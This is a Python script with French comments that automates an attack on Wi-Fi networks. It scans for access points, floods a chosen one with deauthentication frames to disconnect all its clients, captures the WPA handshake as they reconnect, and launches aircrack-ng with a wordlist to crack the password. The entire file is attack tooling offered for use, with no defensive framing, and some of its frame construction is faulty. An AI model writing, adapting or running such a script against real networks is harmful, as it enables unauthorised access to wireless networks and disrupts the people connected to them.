from scapy.all import *
import os
import time

# Variables globales
target_ssid = None
target_bssid = None
handshake_found = False
clients = []

# Dossier pour stocker les captures de paquets
capture_dir = "captures"
if not os.path.exists(capture_dir):
    os.makedirs(capture_dir)

def scan_networks():
    """Scanne les réseaux Wi-Fi disponibles."""
    print("Scanning for available networks...")
    networks = []

    def packet_handler(packet):
        if packet.haslayer(Dot11Beacon):
            ssid = packet[Dot11].info.decode('utf-8', errors='ignore')
            bssid = packet[Dot11].addr2
            if (bssid, ssid) not in networks:
                networks.append((bssid, ssid))
                print(f"Found network: SSID: {ssid} BSSID: {bssid}")

    sniff(iface='wlan0mon', prn=packet_handler, timeout=10)  # Sniffer pour 10 secondes
    return networks

def deauth_clients(target_bssid):
    """Déconnecte tous les clients du réseau cible."""
    print(f"Deauthenticating clients on BSSID: {target_bssid}")
    # Envoyer des paquets de désauthentification à tous les clients connectés
    sendp(Dot11(addr=target_bssid, addr1='ff:ff:ff:ff:ff:ff', subtype=0x0c, type=0), iface='wlan0mon', count=100, inter=.1)

def packet_handler(packet):
    """Gérer les paquets pour capturer les handshakes."""
    global handshake_found
    if packet.haslayer(EAPOL):
        if not handshake_found:
            handshake_found = True
            timestamp = int(time.time())
            capture_file = os.path.join(capture_dir, f'handshake_{timestamp}.pcap')
            wrpcap(capture_file, packet, append=True)
            print(f"Handshake captured! Saved to {capture_file}")
            
            # Lancer le cracking automatiquement après la capture du handshake
            crack_handshake(capture_file)

def crack_handshake(capture_file):
    """Crack le handshake capturé avec une wordlist."""
    wordlist = "/path/to/wordlist.txt"  # Assurez-vous de spécifier le chemin vers votre wordlist
    print("Attempting to crack the handshake...")
    
    # Utilisation de aircrack-ng pour tenter de cracker le handshake
    os.system(f"aircrack-ng -w {wordlist} -b {target_bssid} {capture_file}")

def main():
    # Scanner les réseaux
    networks = scan_networks()
    
    # Choisir un réseau
    global target_ssid, target_bssid
    if networks:
        print("\nChoose a network to deauth clients:")
        for i, (bssid, ssid) in enumerate(networks):
            print(f"{i + 1}: SSID: {ssid}, BSSID: {bssid}")
        
        choice = int(input("Enter the number of the network: ")) - 1
        target_bssid, target_ssid = networks[choice]

        # Déconnecter les clients du réseau choisi
        deauth_clients(target_bssid)

        # Sniffer pour capturer le handshake
        print(f"Listening for handshakes on network: {target_ssid} ({target_bssid})")
        sniff(iface='wlan0mon', prn=packet_handler, store=0)

if __name__ == '__main__':
    main()
